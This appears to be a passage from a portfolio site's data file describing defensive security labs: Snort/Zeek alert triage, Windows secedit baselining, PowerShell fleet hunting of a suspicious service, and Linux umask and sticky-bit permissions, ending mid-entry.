        screenshot: "/labs/ids-snort-zeek-171537.png",
      },
      {
        title: "Inspect Zeek log schema",
        description:
          "Pulled the field list from packet_filter.log using sed. The #fields header lists ts, node, filter, init, success, failure_reason — Zeek's self-describing tab-separated format. Every Zeek log carries this header, which makes downstream parsing (zeek-cut, awk, Splunk) trivial.",
        command: "sed -n 7p packet_filter.log | sed 's/\\t/\\n/g'",
        commandBreakdown: "sed -n 7p: print line 7 (the #fields header)\nsed 's/\\t/\\n/g': convert tabs to newlines for readability",
        screenshot: "/labs/ids-snort-zeek-171652.png",
      },
    ],
    outcome:
      "Reproduced the full Snort3 tuning and detection workflow, identified an SSH CRC32 overflow exploit attempt with 294 Priority-1 alerts from a single attacker IP, then processed the same PCAP with Zeek to demonstrate how NSM complements signature IDS with protocol context and file extraction.",
    nextStepsInProduction:
      "Ship Snort alerts and Zeek logs into the SIEM (Splunk/Elastic) with source-IP correlation. Tune HOME_NET and suppress chatty low-fidelity rules (PROTOCOL-ICMP Unusual PING) so analysts aren't drowning in noise. Write a custom Snort rule for the specific CRC32 overflow pattern if the community rule is too broad, and pipe Zeek extracted files into a sandbox for automated detonation.",
    securityControlsRelevant: [
      "Network IDS (Snort, Suricata)",
      "Network security monitoring (Zeek)",
      "Alert tuning and HOME_NET scoping",
      "SOC playbooks for Priority-1 exploit signatures",
      "Retention of PCAP + Zeek logs for retrospective hunting",
      "File extraction + sandbox detonation pipelines",
    ],
    keyFindings: [
      "294 INDICATOR-SHELLCODE ssh CRC32 overflow alerts concentrated on 20.106.124.93 → 10.130.8.94:22",
      "218 POLICY-OTHER Windows Terminal Server request attempts in the same PCAP",
      "Multiple low-severity SERVER-WEBAPP access rules firing (robots.txt, backup, root access)",
      "Zeek packet_filter.log confirms the BPF was applied successfully",
      "Zeek extract-all-files policy loaded, ready to reconstruct any HTTP/SMB payloads",
    ],
    takeaway: [
      "Snort and Zeek solve different halves of the problem and most teams pick only one. Snort tells you a known-bad pattern matched; Zeek tells you what actually happened on the wire, in context, regardless of whether a signature exists. Running them side by side on the same traffic is how you catch signatures for known attacks and still have log fidelity when a novel one shows up.",
      "HOME_NET = 'any' is the configuration bug nobody talks about. Many rules are written with directional context ($EXTERNAL_NET -> $HOME_NET), so leaving HOME_NET at the default means those rules either over-trigger or never trigger at all. On a new Snort deployment, fixing HOME_NET is step zero before you evaluate any ruleset quality.",
      "The 294-alert SSH shellcode result is a good reminder that signature IDS is still useful — the CRC32 exploit is old, but the same pattern shows up in modern scanner tooling that hasn't been updated. Pairing that signal with Zeek's ssh.log (client software, auth success/failure counts, session duration) is how you go from 'IDS says exploit' to 'here's exactly what the attacker did next.' That's the pivot analysts get paid for.",
    ],
    screenshots: [
      { src: "/labs/ids-snort-zeek-162400.png", alt: "Snort config validation", caption: "snort -T loads all inspectors" },
      { src: "/labs/ids-snort-zeek-162825.png", alt: "Scope HOME_NET", caption: "sed HOME_NET → 10.130.0.0/16" },
      { src: "/labs/ids-snort-zeek-162902.png", alt: "Quiet re-validation", caption: "snort -T -q clean exit" },
      { src: "/labs/ids-snort-zeek-163058.png", alt: "PCAP replay summary", caption: "alert_talos, community rules" },
      { src: "/labs/ids-snort-zeek-163255.png", alt: "alert_fast detail", caption: "INDICATOR-SHELLCODE ssh CRC32 overflow" },
      { src: "/labs/ids-snort-zeek-170811.png", alt: "BPF-focused Snort run", caption: "--bpf 'host 20.106.124.93'" },
      { src: "/labs/ids-snort-zeek-171537.png", alt: "Zeek with extract-all-files", caption: "zeek -C -r investigate.pcap + file extraction policy" },
      { src: "/labs/ids-snort-zeek-171652.png", alt: "Zeek log schema", caption: "packet_filter.log #fields header" },
    ],
  },
  {
    id: 16,
    courseSlug: "sec401",
    slug: "windows-security-policies",
    title: "Lab 5.3 - Applying Windows System Security Policies",
    course: "SEC401 - Windows Security",
    role: "Solo, Lab",
    focus: "Windows Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized PowerShell and MMC screenshots from secedit.exe analyze/configure workflow",
    context:
      "This lab demonstrates how to baseline a Windows host against a security template, identify policy drift, apply a hardened configuration, and verify the change — using secedit.exe from PowerShell and the Security Templates / Security Configuration and Analysis MMC snap-ins.",
    summary:
      "Used secedit.exe to analyze a Windows VM against the Alpha-Win-Wkstn-Basic-Sec-Policy template, surfaced MinimumPasswordLength, LockoutBadCount, and MaximumLogSize mismatches via Select-String on the log, applied the template with /configure, and re-analyzed to confirm the drift was eliminated.",
    whyThisMatters:
      "Every Windows hardening program lives or dies on two questions: does this host match the baseline, and can you prove it after the fact? secedit /analyze and /configure are the oldest, simplest answer to both — zero extra tooling required, and the log format is grep-friendly. If you can't drive this workflow from a console you can't scale hardening to more than one host.",
    tldr: [
      "secedit /analyze compared a live VM to the Alpha basic security template",
      "Surfaced 5 Mismatch entries (password length, lockout, event log size) via Select-String",
      "Applied the template with secedit /configure and re-analyzed to verify",
    ],
    skillsDemonstrated: [
      "Windows security baseline compliance",
      "secedit.exe analyze/configure workflow",
      "Security Templates (.inf) and local policy database (.sdb)",
      "PowerShell log triage with Select-String",
      "MMC Security Configuration and Analysis snap-in",
    ],
    tools: ["secedit.exe", "PowerShell", "Select-String", "MMC", "Security Templates"],
    steps: [
      "Review secedit.exe /analyze syntax and required parameters",
      "Run /analyze against the VM using the Alpha basic security template",
      "Open the compare log in Notepad and visually review Mismatch entries",
      "Filter the log with Select-String 'mismatch' to list only drift",
      "Apply the template with secedit /configure",
      "Re-analyze and produce a second log for before/after evidence",
      "Load Security Templates + Security Configuration and Analysis in MMC",
    ],
    stepDetails: [
      {
        title: "Review secedit.exe /analyze syntax",
        description:
          "Ran secedit /analyze with no arguments to print the help text. The workflow needs three things: a database file (/db) to hold the analysis, a configuration template (/cfg) that defines the desired state, and a log file (/log) to record per-setting results.",
        command: "secedit.exe /analyze",
        commandBreakdown: "/db: analysis database (.sdb)\n/cfg: security template file (.inf)\n/log: output log path\n/quiet: suppress prompts",
        screenshot: "/labs/win-policies-110317.png",
      },
      {
        title: "Analyze the VM against the Alpha basic template",
        description:
          "Ran secedit /analyze against the Alpha-Win-Wkstn-Basic-Sec-Policy.inf template. The engine compares every setting in the template to the current VM state and writes per-setting results to the compare log. Task completed successfully means the analysis engine ran cleanly — the actual drift findings live in the log.",
        command: "secedit.exe /analyze /db alpha-basic-policy.sdb /cfg Alpha-Win-Wkstn-Basic-Sec-Policy.inf /log C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-110611.png",
      },
      {
        title: "Open the compare log and scan for Mismatch",
        description:
          "Opened the log in Notepad and used Find to jump through 'Mismatch' entries. The --Analyze Security Policy-- section shows MinimumPasswordLength as Mismatch while adjacent settings (PasswordHistorySize, MaximumPasswordAge, PasswordComplexity) are Not Configured — meaning the template doesn't define them. LockoutBadCount is also flagged.",
        command: "notepad C:\\sec401\\labs\\5.3\\compare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-110704.png",
      },
      {
        title: "Grep the log with Select-String",
        description:
          "Piped Get-Content to Select-String 'mismatch' to list only the drift. Five Mismatch lines: MinimumPasswordLength, LockoutBadCount, and MaximumLogSize (x3 — one per event log: Application, Security, System). That's the exact hardening delta the template will apply.",
        command: "Get-Content .\\compare-vm-to-alpha-basic-policy.log | Select-String 'mismatch'",
        commandBreakdown: "Get-Content: read file into pipeline\nSelect-String: pattern match (PowerShell's grep)",
        screenshot: "/labs/win-policies-110748.png",
      },
      {
        title: "Apply the template with secedit /configure",
        description:
          "Ran secedit /configure using the same database. /configure is the verb that actually writes the template's settings into local policy. The task completed successfully message means every defined setting in the template was applied.",
        command: "secedit.exe /configure /db alpha-basic-policy.sdb /log C:\\sec401\\labs\\5.3\\apply-apha-basic-policy-to-vm.log",
        commandBreakdown: "/configure: apply template settings to the host\n/db: use the prior analysis database (keeps settings consistent)",
        screenshot: "/labs/win-policies-111118.png",
      },
      {
        title: "Re-analyze to verify the drift is gone",
        description:
          "Ran /analyze a second time and wrote the output to recompare-vm-to-alpha-basic-policy.log. Running the compare twice — once before /configure and once after — is the evidence pattern: the second log should show zero Mismatch entries, which proves the template was applied successfully.",
        command: "secedit.exe /analyze /db alpha-basic-policy.sdb /log C:\\sec401\\labs\\5.3\\recompare-vm-to-alpha-basic-policy.log",
        screenshot: "/labs/win-policies-111344.png",
      },
      {
        title: "Load the MMC snap-ins",
        description:
          "Added Security Templates and Security Configuration and Analysis to an MMC console. The MMC snap-ins are the GUI equivalent of secedit /analyze and /configure — useful for editing .inf templates interactively and for analysts who prefer a tree view. Same engine, different surface.",
        command: "mmc.exe  (File → Add/Remove Snap-in → Security Templates, Security Configuration and Analysis)",
        screenshot: "/labs/win-policies-111527.png",
      },
    ],
    outcome:
      "Demonstrated the full Windows baseline compliance loop: analyze a host against a template, surface the exact drift with Select-String, apply the template, and re-analyze to prove the drift is gone — all from a single PowerShell console with secedit.exe.",
    nextStepsInProduction:
      "In a fleet environment, push the .inf template via Group Policy (SCE → Security Settings) instead of running secedit host-by-host. Automate the analyze/configure/reanalyze loop with a PowerShell wrapper so the compare logs land in a central share for audit evidence. Replace the basic template with a CIS Benchmark or Microsoft Security Compliance Toolkit baseline and extend the detection pipeline so any Mismatch on a production host raises a SIEM alert.",
    securityControlsRelevant: [
      "Windows security baselines (CIS, Microsoft SCT)",
      "Group Policy Objects and Local Security Policy",
      "Password policy (length, history, lockout)",
      "Event log sizing and retention",
      "Configuration drift detection and audit evidence",
    ],
    keyFindings: [
      "MinimumPasswordLength did not match the Alpha basic template",
      "LockoutBadCount did not match the template",
      "MaximumLogSize mismatched on Application, Security, and System event logs",
      "Template applied cleanly via secedit /configure",
      "Re-analysis confirms zero Mismatch entries post-configure",
    ],
    takeaway: [
      "secedit is one of those tools that's been in Windows forever and still does exactly what you want. /analyze and /configure are both idempotent and log-first, which makes them trivially scriptable: run analyze, grep for Mismatch, run configure, run analyze again, diff. That before/after pair of logs is also the cleanest audit artifact you can hand an assessor.",
      "The Not Configured vs. Mismatch distinction in the log matters. Not Configured means the template is silent on that setting — the host can do whatever it wants. Mismatch means the template has an opinion and the host disagrees. A lot of 'we applied the baseline' incidents trace back to teams not reading this distinction and assuming Not Configured means compliant.",
      "The real production move is GPO, not host-by-host secedit. But understanding secedit is what makes the GPO debugging tractable — when a policy doesn't apply on one host, dropping to secedit /analyze on that box is the fastest way to see which specific setting didn't take and why.",
    ],
    screenshots: [
      { src: "/labs/win-policies-110317.png", alt: "secedit /analyze syntax", caption: "secedit.exe /analyze — help text and required parameters" },
      { src: "/labs/win-policies-110611.png", alt: "Analyze against Alpha basic template", caption: "secedit /analyze against Alpha-Win-Wkstn-Basic-Sec-Policy.inf" },
      { src: "/labs/win-policies-110704.png", alt: "Compare log in Notepad", caption: "MinimumPasswordLength and LockoutBadCount Mismatch entries" },
      { src: "/labs/win-policies-110748.png", alt: "Select-String mismatch", caption: "Get-Content | Select-String 'mismatch' — 5 drift lines" },
      { src: "/labs/win-policies-111118.png", alt: "secedit /configure", caption: "Apply template with secedit /configure" },
      { src: "/labs/win-policies-111344.png", alt: "Re-analyze after configure", caption: "secedit /analyze → recompare log as before/after evidence" },
      { src: "/labs/win-policies-111527.png", alt: "MMC snap-ins", caption: "Security Templates + Security Configuration and Analysis in MMC" },
    ],
  },
  {
    id: 17,
    courseSlug: "sec401",
    slug: "powershell-speed-scale",
    title: "Lab 5.4 - Using PowerShell for Speed and Scale",
    course: "SEC401 - Windows Security",
    role: "Solo, Lab",
    focus: "Windows Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized PowerShell console screenshots from a 3-host alpha-svr lab fleet",
    context:
      "This lab demonstrates how PowerShell scales Windows administration and incident response from a single host to a fleet: working with objects through the pipeline, filtering and measuring results, driving remote command execution with Invoke-Command, and using that same remoting surface to hunt a suspicious service (broker.exe/BrokerSvc) deployed across three servers.",
    summary:
      "Used PowerShell cmdlets, the object pipeline, Out-GridView, and Invoke-Command against three remote alpha-svr hosts to enumerate processes and services, then hunted a suspicious BrokerSvc service running broker.exe as LocalSystem and captured its SHA-256 for IOC sharing.",
    whyThisMatters:
      "Windows attackers live on the box with the same tools defenders use. Fluency in PowerShell — pipelines, remoting, Get-WinEvent, Get-FileHash — is what lets a blue-team analyst triage a 3-host (or 3000-host) incident without drowning in RDP sessions or GUI clicks. This lab builds exactly that muscle.",
    tldr: [
      "Pipelined Get-Process/Get-Service with Where-Object, Measure-Object, Out-GridView, Export-CSV",
      "Used Invoke-Command with Get-Credential to run remote queries against alpha-svr1/2/3.local",
      "Hunted a rogue BrokerSvc (broker.exe, LocalSystem, auto-start) and captured its SHA-256",
    ],
    skillsDemonstrated: [
      "PowerShell object pipeline",
      "Remote command execution (Invoke-Command)",
      "Service and process enumeration at scale",
      "Windows Event Log triage (Get-WinEvent 7045)",
      "File integrity hashing (Get-FileHash)",
    ],
    tools: ["PowerShell", "Invoke-Command", "Get-WinEvent", "Get-FileHash", "Out-GridView"],
    steps: [
      "Enumerate local processes: Get-Process",
      "Deep-inspect a process: Get-Process -Name explorer | Select-Object *",
      "Launch and inspect notepad, then kill it via a stored variable",
      "Enumerate services, count them, filter to Running, and count again",
      "Send Get-Service to Out-GridView and Export-Csv for triage",
      "Tour Get-ChildItem (dir alias) and pipe to Sort-Object CreationTime",
      "Bootstrap the fleet with start-servers.ps1 and load alpha-servers.txt",
      "Run Invoke-Command against the fleet with Get-Credential + Basic auth",
      "Hunt for a suspicious exe across C:\\Windows on all three hosts",
      "Correlate with Event ID 7045 (service installed) and SHA-256 the binary",
    ],
    stepDetails: [
      {
        title: "Process overview with Get-Process",
        description:
          "Baseline enumeration of every running process with handles, memory (PM/WS), CPU seconds, PID, and ProcessName. This is the PowerShell equivalent of tasklist, but every row is a live object you can pipe into further filters.",
        command: "Get-Process",
        screenshot: "/labs/powershell-101645.png",
      },
      {
        title: "Deep property view on a single process",
        description:
          "Piped one process into Select-Object -Property * to expose every property the object exposes — FileVersion, Path, Company, HandleCount, WorkingSet, VirtualMemorySize, BasePriority. This is how you learn what you can filter on before writing a Where-Object clause.",
        command: "Get-Process -Name explorer | Select-Object -Property *",
        commandBreakdown: "-Name: match by process name\nSelect-Object -Property *: dump every property on the pipeline object",
        screenshot: "/labs/powershell-101835.png",
      },
      {
        title: "Launch and inspect a process",
        description:
          "Started Notepad with Start-Process, then introspected it with Select-Object *. Confirmed the AppX path under C:\\Program Files\\WindowsApps — useful detail when triaging whether a running binary is the Microsoft-signed Store build or a sideloaded copy.",
        command: "Start-Process notepad.exe\nGet-Process -Name notepad | Select-Object *",
        screenshot: "/labs/powershell-102038.png",
      },
      {
        title: "Capture a process into a variable",
        description:
          "Stored the Notepad process object in $NotepadProc. Variables in PowerShell hold live objects (not strings), so $NotepadProc carries every method and property the process exposes — which is why the next step works.",
        command: "$NotepadProc = Get-Process -Name notepad\n$NotepadProc",
        screenshot: "/labs/powershell-102203.png",
      },
      {
        title: "Invoke a method on the stored object",
        description:
          "Called .kill() on the stored object to terminate Notepad, then re-queried Get-Process to confirm the process is gone (ObjectNotFound error proves the kill succeeded). This pattern — capture, act, re-verify — is the bread-and-butter of automated incident response.",
        command: "$NotepadProc.kill()\nGet-Process -Name notepad",
        screenshot: "/labs/powershell-102336.png",
      },
      {
        title: "Enumerate Windows services",
        description:
          "Get-Service returns every service with Status, Name, and DisplayName. Same object-pipeline story as Get-Process — downstream cmdlets operate on service objects, not parsed text.",
        command: "Get-Service",
        screenshot: "/labs/powershell-102442.png",
      },
      {
        title: "Count services with Measure-Object",
        description:
          "Piped Get-Service to Measure-Object — 278 services installed on this host. Measure-Object is the PowerShell analog to wc -l, except it counts pipeline objects, not lines of text.",
        command: "Get-Service | Measure-Object",
        screenshot: "/labs/powershell-102511.png",
      },
      {
        title: "Filter services to only those Running",
        description:
          "Where-Object -Property Status -like Running narrows the pipeline to active services. Same object flowing through: Get-Service produces, Where-Object filters.",
        command: "Get-Service | Where-Object -Property Status -like Running",
        commandBreakdown: "Where-Object: filter pipeline objects by a predicate\n-Property Status: property to test\n-like Running: comparison (-like is case-insensitive wildcard)",
        screenshot: "/labs/powershell-102612.png",
      },
      {
        title: "Count the running services",
        description:
          "Chained the same filter into Measure-Object — 96 of 278 services are Running. Two cmdlets, one pipeline, zero intermediate files.",
        command: "Get-Service | Where-Object -Property Status -like Running | Measure-Object",
        screenshot: "/labs/powershell-102659.png",
      },
      {
        title: "Out-GridView for interactive triage",
        description:
          "Piped Get-Service to Out-GridView — a sortable, filterable GUI grid. Out-GridView is a triage tool: you can click-filter to a subset, then send the selection back to the pipeline for further processing.",
        command: "Get-Service | Out-GridView",
        screenshot: "/labs/powershell-102750.png",
      },
      {
        title: "Live filter inside Out-GridView",
        description:
          "Added a 'Status contains Running' criteria inside Out-GridView to narrow the grid interactively. Useful when you want to poke around without writing the full Where-Object in advance.",
        command: "Get-Service | Out-GridView",
        screenshot: "/labs/powershell-102830.png",
      },
      {
        title: "Export to CSV and open in ISE",
        description:
          "Dumped every service object to Services.csv with Export-Csv, then opened it in the PowerShell ISE for inspection. Export-Csv serializes every property of every pipeline object — great for offline analysis or evidence preservation.",
        command: "Get-Service | Export-CSV -Path Services.csv\nise .\\Services.csv",
        screenshot: "/labs/powershell-102956.png",
      },
      {
        title: "Directory listing and alias discovery",
        description:
          "Used dir to list the lab directory, then Get-Alias dir to confirm dir is just an alias for Get-ChildItem. Knowing the underlying cmdlet is what lets you pipe dir into object-aware cmdlets like Sort-Object.",
        command: "dir\nGet-Alias dir",
        screenshot: "/labs/powershell-103122.png",
      },
      {
        title: "Inspect a file as an object",
        description:
          "Piped one CSV into Format-List * to expose every property on the FileSystemInfo object — PSPath, VersionInfo, BaseName, Length. Same object-pipeline mental model as processes and services: a file is an object with properties, not just a name.",
        command: "dir .\\Services.csv | Format-List *",
        screenshot: "/labs/powershell-103151.png",
      },
      {
        title: "Sort directory listing by CreationTime",
        description:
          "Piped dir into Sort-Object CreationTime — Services.csv sorts last because it was just created, while the original .ps1 scripts share an older 12/16/2023 timestamp.",
        command: "dir | Sort-Object CreationTime",
        screenshot: "/labs/powershell-103447.png",
      },
      {
        title: "Bootstrap the fleet and load the server list",
        description:
          "Ran start-servers.ps1 to bring the alpha-svr fleet online, then loaded the server list into a typed array with [string[]]$AlphaServers = Get-Content. Typing matters: [string[]] tells Invoke-Command to treat $AlphaServers as a list of computer names, not one long string.",
        command: "./start-servers.ps1\n[string[]]$AlphaServers = Get-Content -Path 'C:\\sec401\\labs\\5.4\\alpha-servers.txt'\n$AlphaServers",
        screenshot: "/labs/powershell-104123.png",
      },
      {
        title: "Invoke-Command across the fleet with credentials",
        description:
          "Captured credentials with Get-Credential, then ran Get-CimInstance Win32_OperatingSystem remotely on all three alpha-svr hosts in one call. The output is a single table with a PSComputerName column — Invoke-Command returns deserialized objects from every remote host, merged into one pipeline.",
        command: "$creds = Get-Credential\ninvoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-CimInstance Win32_OperatingSystem | Select-Object CSName, Caption } | Format-Table",
        commandBreakdown: "-Authentication Basic: simple auth (lab only — use Kerberos/CredSSP in prod)\n-Credential: PSCredential object from Get-Credential\n-ComputerName: array of targets\n-command { ... }: scriptblock executed on every remote host",
        screenshot: "/labs/powershell-104456.png",
      },
      {
        title: "Negative control: probe for a file that doesn't exist",
        description:
          "Ran Get-ChildItem C:\\Windows\\System32\\proxy.exe across the fleet — all three hosts returned PathNotFound. This is a deliberate negative control: it proves Invoke-Command is routing to all three hosts and that the hunt query below isn't silently failing.",
        command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\System32\\proxy.exe } | Format-Table",
        screenshot: "/labs/powershell-104709.png",
      },
      {
        title: "Fleet-wide enumeration of C:\\Windows\\*.exe",
        description:
          "Listed every EXE directly under C:\\Windows on all three hosts. The output reveals the same five binaries on each host — bfsvc.exe, notepad.exe, regedit.exe, write.exe (expected Windows binaries) plus broker.exe with a 10/21/2023 timestamp. broker.exe is not a default Windows binary at that path and shows up on every host — a strong IOC signal.",
        command: "invoke-command -Authentication Basic -Credential $creds -ComputerName $AlphaServers -command { Get-ChildItem C:\\Windows\\*.exe } | Format-Table",
        screenshot: "/labs/powershell-104904.png",
      },
      {
        title: "Correlate with Event ID 7045 (service installed)",
        description:
          "Entered a remote session on alpha-svr3 and queried the System log for Event ID 7045 (Service Control Manager: a service was installed). Got a direct match: BrokerSvc, c:\\Windows\\broker.exe, user mode service, auto start, running as LocalSystem. That's the full install record — who installed it (SCM context), when (TimeCreated 12/12/2023), and with what privileges (LocalSystem = full admin on the box).",
        command: "Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 3 | format-list",
        commandBreakdown: "-FilterHashtable: server-side XPath-equivalent filter (fast)\nLogName: which log to query\nID=7045: Service Control Manager 'a service was installed' event\n-MaxEvents 3: cap results",
        screenshot: "/labs/powershell-105306.png",
      },
      {
        title: "Hash the suspicious binary for IOC sharing",
        description:
          "Ran Get-FileHash -Algorithm SHA256 against C:\\Windows\\broker.exe on the remote host. SHA-256: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31. That hash is the shareable IOC: feed it to VirusTotal, add it to a SIEM watchlist, or block it with Defender ASR — it's what turns this single-lab finding into fleet-wide detection content.",
        command: "Get-FileHash -Algorithm SHA256 C:\\Windows\\broker.exe",
        commandBreakdown: "-Algorithm SHA256: hash algorithm (MD5/SHA1/SHA256/SHA512 supported)",
        screenshot: "/labs/powershell-105415.png",
      },
    ],
    outcome:
      "Demonstrated the full arc of PowerShell for Windows incident response: local enumeration with pipelines, interactive triage with Out-GridView, remote execution across a 3-host fleet with Invoke-Command, and a concrete hunt that surfaced a rogue BrokerSvc running broker.exe as LocalSystem — complete with a SHA-256 suitable for distribution as an IOC.",
    nextStepsInProduction:
      "Ship the SHA-256 to the SIEM and EDR as a detection. Pull the full Event ID 7045 history across the fleet to identify every host where BrokerSvc was installed, not just the three in the lab. Quarantine broker.exe, capture a memory image of any host where it's running, and pivot to 4697 (Security log) and Sysmon Event ID 1/7 for process creation and image-load context. Rotate any credentials that could have been harvested from the LocalSystem-privileged service.",
    securityControlsRelevant: [
      "PowerShell remoting over WinRM (constrained to signed scriptblocks in prod)",
      "Service installation auditing (Event ID 7045, 4697)",
      "File integrity monitoring + SHA-256 IOC sharing",
      "Endpoint detection (Defender for Endpoint, Sysmon)",
      "Least-privilege service accounts (no LocalSystem for custom services)",
    ],
    keyFindings: [
      "278 services enumerated on the admin workstation; 96 Running",
      "broker.exe present on alpha-svr1/2/3.local under C:\\Windows with matching 10/21/2023 timestamp",
      "Event ID 7045 shows BrokerSvc installed as auto-start user-mode service under LocalSystem",
      "SHA-256 of broker.exe: 646DF7C22A76C92CF6CD83A9B7970C95514047C9431B29909732C62F28963E31",
      "Invoke-Command successfully executed against three hosts in parallel from a single console",
    ],
    takeaway: [
      "The object pipeline is the thing that matters in PowerShell, and it's the part that trips up people coming from bash. Get-Service isn't returning lines of text, it's returning ServiceController objects — which is why Where-Object -Property Status works without any parsing and why Export-Csv can serialize every property automatically. Once you internalize that, you stop writing awk-style text hacks and start chaining cmdlets.",
      "Invoke-Command is where PowerShell stops being a shell and starts being a fleet tool. Being able to fire the same scriptblock at three — or three thousand — hosts and get back one merged object pipeline is what makes hunting feasible at scale. The negative control here (probing a path that doesn't exist) is the muscle I'd want every analyst to build: before you trust a hunt query, confirm it's actually reaching every target.",
      "The broker.exe finding is a good real-world shape. The binary sits in C:\\Windows (not System32), shows up identically on every host, has a matching 7045 event, and runs as LocalSystem. None of those signals alone would be conclusive, but together they turn a generic 'enumerate EXEs' query into a clean IOC with a hash you can distribute. That's the workflow — enumerate, correlate, hash, share — and PowerShell gives you all of it in one console.",
    ],
    screenshots: [
      { src: "/labs/powershell-101645.png", alt: "Get-Process output", caption: "Get-Process — full process table" },
      { src: "/labs/powershell-101835.png", alt: "Select-Object -Property * on explorer", caption: "Every property on the Explorer process object" },
      { src: "/labs/powershell-102038.png", alt: "Start and inspect notepad", caption: "Start-Process notepad.exe; Get-Process -Name notepad | Select *" },
      { src: "/labs/powershell-102203.png", alt: "Capture process into variable", caption: "$NotepadProc = Get-Process -Name notepad" },
      { src: "/labs/powershell-102336.png", alt: "Kill process via stored object", caption: "$NotepadProc.kill() — verified by ObjectNotFound on re-query" },
      { src: "/labs/powershell-102442.png", alt: "Get-Service output", caption: "Get-Service — full service list" },
      { src: "/labs/powershell-102511.png", alt: "Measure-Object count", caption: "Get-Service | Measure-Object → 278" },
      { src: "/labs/powershell-102612.png", alt: "Where-Object filter Running", caption: "Get-Service | Where-Object -Property Status -like Running" },
      { src: "/labs/powershell-102659.png", alt: "Count running services", caption: "96 Running of 278 total" },
      { src: "/labs/powershell-102750.png", alt: "Out-GridView", caption: "Get-Service | Out-GridView" },
      { src: "/labs/powershell-102830.png", alt: "Out-GridView filter Running", caption: "Live filter inside Out-GridView" },
      { src: "/labs/powershell-102956.png", alt: "Export-Csv and open in ISE", caption: "Services.csv opened in Windows PowerShell ISE" },
      { src: "/labs/powershell-103122.png", alt: "dir and Get-Alias dir", caption: "dir is an alias for Get-ChildItem" },
      { src: "/labs/powershell-103151.png", alt: "Format-List on a file", caption: "dir .\\Services.csv | Format-List * — every property" },
      { src: "/labs/powershell-103447.png", alt: "Sort by CreationTime", caption: "dir | Sort-Object CreationTime" },
      { src: "/labs/powershell-104123.png", alt: "Load alpha-servers.txt", caption: "start-servers.ps1 + typed array Get-Content" },
      { src: "/labs/powershell-104456.png", alt: "Invoke-Command across fleet", caption: "Win32_OperatingSystem query on alpha-svr1/2/3.local" },
      { src: "/labs/powershell-104709.png", alt: "Negative control: missing file", caption: "proxy.exe → PathNotFound on all three hosts" },
      { src: "/labs/powershell-104904.png", alt: "Fleet-wide C:\\Windows\\*.exe", caption: "broker.exe found on every host — IOC candidate" },
      { src: "/labs/powershell-105306.png", alt: "Event ID 7045 BrokerSvc", caption: "Service Control Manager: BrokerSvc installed, LocalSystem, auto start" },
      { src: "/labs/powershell-105415.png", alt: "SHA-256 of broker.exe", caption: "Get-FileHash → 646DF7C2…63E31" },
    ],
  },
  {
    id: 18,
    courseSlug: "sec401",
    slug: "linux-permissions",
    title: "Lab 6.1 - Linux Permissions",
    course: "SEC401 - Containers, Linux and Mac Security",
    role: "Solo, Lab",
    focus: "Linux Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized terminal screenshots from a Docker-based permissions lab container",
    context:
      "This lab demonstrates the core Linux discretionary access control primitives — file mode bits, umask, and the sticky bit — inside a disposable Docker container. The goal is to understand why default permissions are what they are, how to tighten them for a hardening baseline, and how the sticky bit protects world-writable directories like /tmp from cross-user tampering.",
    summary:
      "Spun up a Docker permissions lab, tested default umask 0022 (producing 644/755), tightened to umask 0027 to strip world access (640/750), and demonstrated the /tmp sticky bit (drwxrwxrwt) preventing non-owner delete on a shared directory.",
    whyThisMatters:
      "Most Linux privilege escalation findings in CTFs and real audits come down to permissions that should have been tighter. Understanding umask, group-vs-other bits, and the sticky bit is the difference between writing a hardening baseline and copy-pasting one you don't understand. It's also what lets you explain to a dev why their world-readable config file is a finding.",
    tldr: [
      "Started a Docker lab container and connected as user annika",
      "Observed default umask 0022 producing 644 files and 755 directories",
      "Tightened umask to 0027 (group-readable, world-nothing) and confirmed 640/750 outputs",
      "Demonstrated the sticky bit on /tmp (drwxrwxrwt) for shared-directory safety",
    ],
    skillsDemonstrated: [
      "Linux file mode bits (owner/group/other)",
      "umask math and default permission inheritance",
      "Sticky bit and shared-directory safety",
      "Container-based lab workflows (docker compose)",
      "ls -l / ls -ld interpretation",
    ],
    tools: ["Linux", "bash", "Docker", "umask", "ls", "chmod"],
    steps: [
      "Start the lab container with start_6.1.sh and connect as annika",
      "Create a file with the default umask and inspect its mode",
      "Read the current umask (0022) and map it to 644/755",
      "Change umask to 0027 and confirm new files/dirs drop all world access",
      "Inspect /tmp and identify the sticky bit (drwxrwxrwt)",
      "Write a sticky-bit test file inside /tmp to observe per-owner delete semantics",
    ],
    stepDetails: [
      {
        title: "Start the Docker lab container",
        description:
          "Ran start_6.1.sh to bring up the lab-61-permissions-1 container on the lab-61_default network. The 'docker stop/rm requires at least 1 argument' lines are the script safely reporting that no prior container existed to clean up. End state: container Running 2/2.",
        command: "cd /sec401/labs/6.1\n./start_6.1.sh",
        screenshot: "/labs/linux-perms-112203.png",
      },
      {
        title: "Connect into the container as annika",
        description:
          "Ran connect.sh to drop into a shell inside the container as user annika. Every subsequent command runs inside this disposable container, so nothing touches the host.",
        command: "./connect.sh",
        screenshot: "/labs/linux-perms-112213.png",
      },
      {
        title: "Create a file with the default umask",
        description:
          "Wrote a line to test_perms.txt with echo, cat-ed it back to confirm content, then ls -l to read the mode. Output: -rw-r--r-- 1 annika annika 7. Owner rw, group r, other r — the canonical 644 you get with umask 0022.",
        command: "echo annika > test_perms.txt\ncat test_perms.txt\nls -l test_perms.txt",
        screenshot: "/labs/linux-perms-112304.png",
      },
      {
        title: "Read the current umask",
        description:
          "umask prints 0022. The mask works by subtracting bits from the base (666 for files, 777 for dirs): 666 - 022 = 644 for files, 777 - 022 = 755 for dirs. That's why the file above landed on 644 without any chmod.",
        command: "umask",
        screenshot: "/labs/linux-perms-113116.png",
      },
      {
        title: "Tighten umask to 0027 and retest",
        description:
          "Set umask to 0027 (group read only, world nothing), created a new file and directory, and listed them. Output: -rw-r----- for secure.txt and drwxr-x--- for secure_dir. That's 640/750 — the hardening baseline used by most CIS benchmarks because it cuts world access entirely while keeping same-group collaboration working.",
